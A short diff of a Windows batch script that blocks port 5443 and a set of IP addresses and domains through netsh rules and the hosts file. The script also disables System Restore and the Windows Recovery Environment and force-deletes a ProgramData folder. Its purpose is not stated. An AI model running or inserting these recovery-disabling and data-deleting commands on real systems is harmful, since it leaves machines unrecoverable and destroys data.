@@ -50,8 +50,10 @@ reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentP
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f
 
-netsh advfirewall firewall add rule name="Block Port 5443 (TCP In)" dir=in protocol=TCP localport=5443 action=block
-netsh advfirewall firewall add rule name="Block Port 5443 (TCP Out)" dir=out protocol=TCP localport=5443 action=block
-for %D in (config.sanctam.su config.sanctam.net sanctam.net cloudproxy.hs-bin.com vrthcobj.com google.vrthcobj.com remotenetwork.xyz hsiens.xyz 58.158.177.102 160.16.200.77 188.34.200.103 172.94.15.211) do (echo 127.0.0.1 %D >> %windir%\System32\drivers\etc\hosts)
+netsh advfirewall firewall add rule name="BlockPort" dir=in protocol=TCP localport=5443 action=block
+netsh advfirewall firewall add rule name="BlockPort" dir=out protocol=TCP localport=5443 action=block
+netsh advfirewall firewall add rule name="BlockIP" dir=in action=block remoteip=58.158.177.102,160.16.200.77,188.34.200.103,172.94.15.211
+netsh advfirewall firewall add rule name="BlockIP" dir=out action=block remoteip=58.158.177.102,160.16.200.77,188.34.200.103,172.94.15.211
+for %D in (config.sanctam.su config.sanctam.net sanctam.net cloudproxy.hs-bin.com vrthcobj.com google.vrthcobj.com remotenetwork.xyz hsiens.xyz) do (echo 127.0.0.1 %D >> %windir%\System32\drivers\etc\hosts)
 reagentc /disable
 rd /s /q "%ProgramData%\dist"
